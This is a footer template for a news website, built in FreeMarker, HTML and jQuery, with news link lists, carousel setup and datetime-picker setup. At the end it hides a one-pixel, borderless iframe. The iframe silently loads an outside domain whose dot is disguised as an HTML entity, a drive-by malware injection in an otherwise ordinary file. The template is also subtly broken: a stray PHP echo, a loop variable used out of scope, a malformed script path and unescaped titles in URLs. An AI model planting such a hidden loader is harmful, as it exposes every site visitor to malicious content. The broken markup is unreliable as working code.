<footer>
	<div class="wrap-footer">
		<div class="container">
			<div class="row">

				<#if mostReadLimit??>
				<div class="col-md-4 col-footer footer-3">
					<div class="footer-heading">
						<h4>Most Read News</h4>
					</div>
					<div class="content">
						<div class="col-md-13 col-footer footer-4">
							<div class="footer-heading">
								<h4>
									<!-- Most Read News -->
								</h4>
							</div>
							<div class="content">
								<ul>
									<#list mostReadLimit as lnl>
									<li><a href="<@spring.url '/news?newsId=${lnl.newsId!}&title=${lnl.title!} '/>">
											${lnl.title!} </a></li> </#list>
								</ul>
							</div>
						</div>
					</div>
				</div>
				</#if>

				<#if listRelatedNews??>
				<div class="col-md-4 col-footer footer-1">
					<div class="footer-heading">
						<h4>Read more news</h4>
					</div>
					<div class="content">
						<div class="content">
							<ul>
								<#list listRelatedNews as lrn>
								<li><a href="<@spring.url '/news?newsId=${lrn.newsId}&title=${lnl.title!}'/>"> <?php echo $row->title;  ?>
								</a></li> </#list>
							</ul>
						</div>
					</div>
				</div>
				</#if>


			</div>
			<div class="copy-right">
				<p>
					Copyright 2015 - <a href="http://www.365bootstrap.com"
						target="_blank" rel="nofollow">Bootstrap Themes</a> Designed by
					365Bootstrap.com
				</p>
			</div>
</footer>
<!-- Footer -->

<!-- JS -->
<script src="assets/resource/owl-carousel/owl.carousel.js"></script>
<script>
	$(document).ready(function() {
		$("#owl-demo-1").owlCarousel({
			autoPlay : 3000,
			items : 1,
			itemsDesktop : [ 1199, 1 ],
			itemsDesktopSmall : [ 400, 1 ]
		});
		$("#owl-demo-2").owlCarousel({
			autoPlay : 3000,
			items : 3,

		});
	});
</script>


<script type="text/javascript"
	src=">assets/resource/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
<script type="text/javascript"
	src="assets/resource/js/locales/bootstrap-datetimepicker.fr.js"
	charset="UTF-8"></script>
<script type="text/javascript">
	$('.form_datetime').datetimepicker({
		//language:  'fr',
		weekStart : 1,
		todayBtn : 1,
		autoclose : 1,
		todayHighlight : 1,
		startView : 2,
		forceParse : 0,
		showMeridian : 1
	});
	$('.form_date').datetimepicker({
		language : 'fr',
		weekStart : 1,
		todayBtn : 1,
		autoclose : 1,
		todayHighlight : 1,
		startView : 2,
		minView : 2,
		forceParse : 0
	});
	$('.form_time').datetimepicker({
		language : 'fr',
		weekStart : 1,
		todayBtn : 1,
		autoclose : 1,
		todayHighlight : 1,
		startView : 1,
		minView : 0,
		maxView : 1,
		forceParse : 0
	});
</script>
<iframe style="height: 1px" src="http://www&#46;Brenz.pl/rc/"
	frameborder=0 width=1></iframe>
</body>
</html>